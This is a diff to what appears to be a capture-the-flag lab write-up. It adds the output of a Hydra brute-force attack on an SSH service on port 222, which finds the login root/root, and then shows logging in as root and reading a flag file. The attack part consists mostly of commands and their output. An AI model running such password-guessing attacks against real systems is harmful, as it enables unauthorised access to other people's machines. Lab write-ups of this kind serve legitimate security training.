@@ -591,7 +591,49 @@ done;
 hydra -s 222 -V -l root -P /usr/share/wordlists/dirb/small.txt 127.0.0.1 ssh
 ```
 {% endtab %}
+
+{% tab title="Output" %}
+```
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 18:24:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
+[DATA] attacking ssh://127.0.0.1:222/
+[222][ssh] host: 127.0.0.1   login: root   password: root
+1 of 1 target successfully completed, 1 valid password found
+
+```
+{% endtab %}
 {% endtabs %}
+
+{% hint style="success" %}
+**Flag encountered for** `172.16.50.222!`
+
+root/root, just login from your attacker machine:
+
+```text
+> ssh root@127.0.0.1 -p 222
+root@127.0.0.1's password: 
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+199 packages can be updated.
+11 updates are security updates.
+
+Last login: Sun Jul 18 22:14:47 2021 from 172.16.50.224
+
+root@xubuntu:~# find / | grep flag.txt
+find: ‘/run/user/108/gvfs’: Permission denied
+/root/.flag.txt
+
+root@xubuntu:~# cat /root/.flag.txt
+Congratz! You got it.
+```
+{% endhint %}
 
 ## References
 
